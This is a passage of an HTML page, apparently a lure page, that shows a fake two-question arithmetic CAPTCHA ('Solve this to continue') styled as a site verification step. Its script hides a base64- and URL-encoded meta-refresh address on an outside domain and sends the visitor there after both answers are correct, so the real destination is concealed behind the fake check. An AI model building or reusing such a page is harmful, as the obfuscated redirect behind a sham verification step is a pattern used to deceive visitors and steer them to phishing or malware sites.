      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
      position: relative;
    }

      position: absolute;
      top: 20px;
      left: 20px;
      display: flex;
      align-items: center;
      z-index: 100;
    }

    .logo img {
      width: 60px;
      height: 60px;
      margin-right: 12px;
    }

    .logo span {
      font-size: 1.5rem;
      font-weight: 600;
      color: #007bff;
      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
    }

    #captcha-box {
      background: #fff;
      padding: 40px 30px;
      border-radius: 16px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
      text-align: center;
      width: 100%;
      max-width: 400px;
      border-top: 5px solid #007bff;
    }

    h2 {
      margin-bottom: 25px;
      font-size: 1.6rem;
      color: #007bff;
    }

    #captcha-question {
      font-size: 1.2rem;
      margin-bottom: 15px;
      color: #333;
    }

    input[type="number"] {
      font-size: 1rem;
      padding: 10px;
      width: 60%;
      max-width: 200px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 6px;
      text-align: center;
    }

    button {
      padding: 12px 24px;
      font-size: 1rem;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    button:hover {
      background-color: #0056b3;
    }

    #message {
      margin-top: 15px;
      font-size: 1rem;
      color: #333;
      min-height: 24px;
    }

    #success-icon {
      font-size: 2rem;
      color: green;
      display: none;
      margin-top: 10px;
    }

    @media (max-width: 480px) {
      #captcha-box {
        padding: 25px 20px;
      }

      input[type="number"] {
        width: 100%;
      }

      button {
        width: 100%;
        margin-top: 10px;
      }

      .logo img {
        width: 50px;
        height: 50px;
      }

      .logo span {
        font-size: 1.2rem;
      }
    }

  <!-- CAPTCHA Box -->
  <div id="captcha-box">
    <h2>Solve this to continue</h2>
    <div id="captcha-question">Loading...</div>
    <input type="number" id="user-answer" placeholder="Your answer" />
    <br />
    <button onclick="validateCaptcha()">Submit</button>
    <div id="message"></div>
    <div id="success-icon">✅</div>
  </div>

  <script>
    let answer = 0;
    let firstSolved = false;
    const base64Meta = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF";

    function generateCaptcha() {
      const num1 = Math.floor(Math.random() * 20) + 1;
      const num2 = Math.floor(Math.random() * 10) + 1;
      const operations = ['+', '-', '*'];
      const operation = operations[Math.floor(Math.random() * operations.length)];
      let question = '';

      switch (operation) {
        case '+':
          answer = num1 + num2;
          question = `${num1} + ${num2}`;
          break;
        case '-':
          answer = num1 - num2;
          question = `${num1} - ${num2}`;
          break;
        case '*':
          answer = num1 * num2;
          question = `${num1} × ${num2}`;
          break;
      }

      document.getElementById("captcha-question").innerText = `What is ${question}?`;
      document.getElementById("user-answer").value = '';
      document.getElementById("message").innerText = '';
      document.getElementById("success-icon").style.display = "none";
    }

    function validateCaptcha() {
      const userAnswer = parseInt(document.getElementById("user-answer").value);
      const msg = document.getElementById("message");
      const successIcon = document.getElementById("success-icon");

      if (userAnswer === answer) {
        if (!firstSolved) {
          firstSolved = true;
          msg.innerText = "✅ Correct! One more to go...";
          generateCaptcha();
        } else {
          msg.innerText = "✅ Access granted!";
          successIcon.style.display = "block";
          setTimeout(() => redirectUser(), 1500);
        }
      } else {
        msg.innerText = "❌ Incorrect. Try again.";
        successIcon.style.display = "none";
      }
    }

    function redirectUser() {
      try {
        const decoded = decodeURIComponent(atob(base64Meta));
        const urlMatch = decoded.match(/url=([^"]+)/);
        if (urlMatch && urlMatch[1]) {
          window.location.href = urlMatch[1];
        } else {
          document.getElementById("message").innerText = "⚠️ Invalid redirect link.";
        }
      } catch {
        document.getElementById("message").innerText = "⚠️ Redirect error.";
      }
    }

    window.onload = generateCaptcha;
  </script>
